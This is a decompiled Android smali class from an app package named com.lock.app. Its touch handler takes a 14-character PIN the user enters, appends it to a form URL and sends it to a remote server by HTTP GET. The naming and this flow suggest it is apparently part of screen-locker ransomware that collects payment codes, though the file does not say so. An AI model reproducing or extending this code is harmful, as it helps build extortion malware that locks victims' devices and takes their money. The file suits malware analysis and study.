.class Lcom/lock/app/StartOvView$12;
.super Ljava/lang/Object;
.source "StartOvView.java"

# interfaces
.implements Landroid/view/View$OnTouchListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/lock/app/StartOvView;->refreshViews()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/lock/app/StartOvView;


# direct methods
.method constructor <init>(Lcom/lock/app/StartOvView;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/lock/app/StartOvView$12;->this$0:Lcom/lock/app/StartOvView;

    .line 305
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onTouch(Landroid/view/View;Landroid/view/MotionEvent;)Z
    .locals 10
    .param p1, "v"    # Landroid/view/View;
    .param p2, "event"    # Landroid/view/MotionEvent;

    .prologue
    const/4 v5, 0x1

    const/4 v6, 0x0

    .line 309
    invoke-virtual {p2}, Landroid/view/MotionEvent;->getAction()I

    move-result v7

    if-nez v7, :cond_1

    .line 311
    iget-object v6, p0, Lcom/lock/app/StartOvView$12;->this$0:Lcom/lock/app/StartOvView;

    iget-object v6, v6, Lcom/lock/app/StartOvView;->in_pin:Landroid/widget/EditText;

    invoke-virtual {v6}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v6

    invoke-interface {v6}, Landroid/text/Editable;->toString()Ljava/lang/String;

    move-result-object v4

    .line 313
    .local v4, "send_pin":Ljava/lang/String;
    invoke-virtual {v4}, Ljava/lang/String;->length()I

    move-result v0

    .line 314
    .local v0, "count_pin":I
    const/16 v6, 0xe

    if-eq v0, v6, :cond_0

    .line 315
    iget-object v6, p0, Lcom/lock/app/StartOvView$12;->this$0:Lcom/lock/app/StartOvView;

    iget-object v6, v6, Lcom/lock/app/StartOvView;->response:Landroid/widget/TextView;

    const-string v7, "Invalid pin. Check pin!"

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 351
    .end local v0    # "count_pin":I
    .end local v4    # "send_pin":Ljava/lang/String;
    :goto_0
    return v5

    .line 322
    .restart local v0    # "count_pin":I
    .restart local v4    # "send_pin":Ljava/lang/String;
    :cond_0
    :try_start_0
    iget-object v6, p0, Lcom/lock/app/StartOvView$12;->this$0:Lcom/lock/app/StartOvView;

    iget-object v7, v6, Lcom/lock/app/StartOvView;->formurl:Ljava/lang/String;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v8, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v7, "&pin="

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v6, Lcom/lock/app/StartOvView;->formurl:Ljava/lang/String;

    .line 323
    new-instance v6, Lcom/lock/app/StartOvView$HttpGetDemo;

    iget-object v7, p0, Lcom/lock/app/StartOvView$12;->this$0:Lcom/lock/app/StartOvView;

    invoke-direct {v6, v7}, Lcom/lock/app/StartOvView$HttpGetDemo;-><init>(Lcom/lock/app/StartOvView;)V

    const/4 v7, 0x1

    new-array v7, v7, [Landroid/widget/TextView;

    const/4 v8, 0x0

    iget-object v9, p0, Lcom/lock/app/StartOvView$12;->this$0:Lcom/lock/app/StartOvView;

    iget-object v9, v9, Lcom/lock/app/StartOvView;->textID:Landroid/widget/TextView;

    aput-object v9, v7, v8

    invoke-virtual {v6, v7}, Lcom/lock/app/StartOvView$HttpGetDemo;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 325
    iget-object v6, p0, Lcom/lock/app/StartOvView$12;->this$0:Lcom/lock/app/StartOvView;

    iget-object v6, v6, Lcom/lock/app/StartOvView;->response:Landroid/widget/TextView;

    invoke-virtual {v6}, Landroid/widget/TextView;->getText()Ljava/lang/CharSequence;

    move-result-object v6

    invoke-interface {v6}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v3

    .line 326
    .local v3, "new_respons":Ljava/lang/String;
    iget-object v6, p0, Lcom/lock/app/StartOvView$12;->this$0:Lcom/lock/app/StartOvView;

    iget-object v6, v6, Lcom/lock/app/StartOvView;->response:Landroid/widget/TextView;

    invoke-virtual {v6, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 328
    .end local v3    # "new_respons":Ljava/lang/String;
    :catch_0
    move-exception v1

    .line 333
    .local v1, "e":Ljava/lang/Exception;
    :try_start_1
    iget-object v6, p0, Lcom/lock/app/StartOvView$12;->this$0:Lcom/lock/app/StartOvView;

    iget-object v7, v6, Lcom/lock/app/StartOvView;->formurl:Ljava/lang/String;

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-static {v7}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v7

    invoke-direct {v8, v7}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v7, "&pin="

    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    iput-object v7, v6, Lcom/lock/app/StartOvView;->formurl:Ljava/lang/String;

    .line 334
    iget-object v6, p0, Lcom/lock/app/StartOvView$12;->this$0:Lcom/lock/app/StartOvView;

    invoke-virtual {v6}, Lcom/lock/app/StartOvView;->executeHttpGet()Ljava/lang/String;

    .line 335
    iget-object v6, p0, Lcom/lock/app/StartOvView$12;->this$0:Lcom/lock/app/StartOvView;

    iget-object v6, v6, Lcom/lock/app/StartOvView;->response:Landroid/widget/TextView;

    iget-object v7, p0, Lcom/lock/app/StartOvView$12;->this$0:Lcom/lock/app/StartOvView;

    iget-object v7, v7, Lcom/lock/app/StartOvView;->sender_pin:Ljava/lang/String;

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    .line 338
    :catch_1
    move-exception v2

    .line 339
    .local v2, "ev":Ljava/lang/Exception;
    iget-object v6, p0, Lcom/lock/app/StartOvView$12;->this$0:Lcom/lock/app/StartOvView;

    iget-object v6, v6, Lcom/lock/app/StartOvView;->response:Landroid/widget/TextView;

    const-string v7, "SERVER IS BUSY AT THIS MOMENT.TRY AGAIN LATER.CHECK THE INTERNET CONNECTION"

    invoke-virtual {v6, v7}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 340
    iget-object v6, p0, Lcom/lock/app/StartOvView$12;->this$0:Lcom/lock/app/StartOvView;

    iget-object v6, v6, Lcom/lock/app/StartOvView;->response:Landroid/widget/TextView;

    invoke-virtual {v6}, Landroid/widget/TextView;->requestFocus()Z

    goto/16 :goto_0

    .end local v0    # "count_pin":I
    .end local v1    # "e":Ljava/lang/Exception;
    .end local v2    # "ev":Ljava/lang/Exception;
    .end local v4    # "send_pin":Ljava/lang/String;
    :cond_1
    move v5, v6

    .line 351
    goto/16 :goto_0
.end method
